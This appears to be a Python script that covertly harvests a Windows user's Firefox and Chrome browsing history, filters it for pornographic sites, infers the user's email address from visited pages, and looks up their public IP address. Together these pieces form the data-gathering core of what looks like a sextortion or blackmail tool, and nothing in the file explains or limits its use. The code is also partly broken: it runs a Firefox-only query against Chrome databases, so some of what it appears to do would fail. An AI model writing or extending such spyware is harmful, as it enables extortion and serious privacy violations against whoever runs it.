import sqlite3
from pathlib import Path
import re
import requests

def get_ip_address():
    response = requests.get('https://api.ipify.org')
    return response.text

def gethist():
    global history,sorted_visit_count,links
    history = []
    links = []


    user = str(Path.cwd()).split('\\')[2]
    profiles = []
    try:
        path = Path(f'C:\\Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
        profiles += [str(f) + '\\places.sqlite' for f in path.iterdir() if f.is_dir()]
    except:
        pass
    try:
        path = Path(f'C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data')
        profiles += [str(f) + '\\History' for f in path.iterdir() if f.is_dir()]
    except:
        pass

    visit_count = {}
    for profile in profiles:
        # print(profile)
        conn = sqlite3.connect(f'{profile}')
        cursor = conn.cursor()
        # Execute a SQL query to select the URL, title, and visit time from the "moz_places" table

        query = '''
            SELECT * FROM moz_places ORDER BY visit_count ASC
            '''

        try:
            result = cursor.execute(query).fetchall()
            for row in result:
                domain_name = row[2]
                # print(domain_name)
                try:
                    if any(word in row[2] for word in ['porn', 'xxx', 'hentai', 'yiff', 'e621']):
                        if not any(word in row[2] for word in ['email', 'gmail']):
                            history.append(domain_name)
                            links.append(row[1])
                except:
                    w = 0
                if int(row[4]) > 0:
                    if domain_name in visit_count:
                        visit_count[domain_name] += row[4]
                    else:
                        visit_count[domain_name] = row[4]
        except sqlite3.OperationalError as e:
            pass
    query = '''
                SELECT * FROM visits ORDER BY visit_time
                '''

    try:
        result = cursor.execute(query).fetchall()
        for row in result:
            domain_name = row[2]
            # print(row[3])
            try:
                if any(word in row[2] for word in ['porn', 'xxx', 'hentai', 'yiff']):
                    if not any(word in row[2] for word in ['email', 'gmail']):
                        history.append(domain_name)
                        links.append(row[1])
            except:
                pass

            if int(row[3]) > 0:
                if domain_name in visit_count:
                    visit_count[domain_name] += row[3]
                else:
                    visit_count[domain_name] = row[3]
    except sqlite3.OperationalError as e:
        pass
    # sort the dictionary by visit count in descending order
    sorted_visit_count = {k: v for k, v in sorted(visit_count.items(), key=lambda item: item[1])}
    conn.close()

def findinfo():
    #print(history)
    num = 0
    email_counts = {}
    # print the sorted dictionary
    for k, v in sorted_visit_count.items():
        #print(k)
        if k and '@' in k and '.com' in k:
            # Regular expression to match email address
            email_regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'

            # Extract email address from input string
            email = re.search(email_regex, k)

            # If email address is found, add it to the dictionary
            if email:
                email_address = email.group().lower()
                if email_address in email_counts:
                    email_counts[email_address] += 1
                else:
                    email_counts[email_address] = 1

    #print(f'your email is most likely {max(email_counts, key=email_counts.get)}')
    return max(email_counts, key=email_counts.get)

gethist()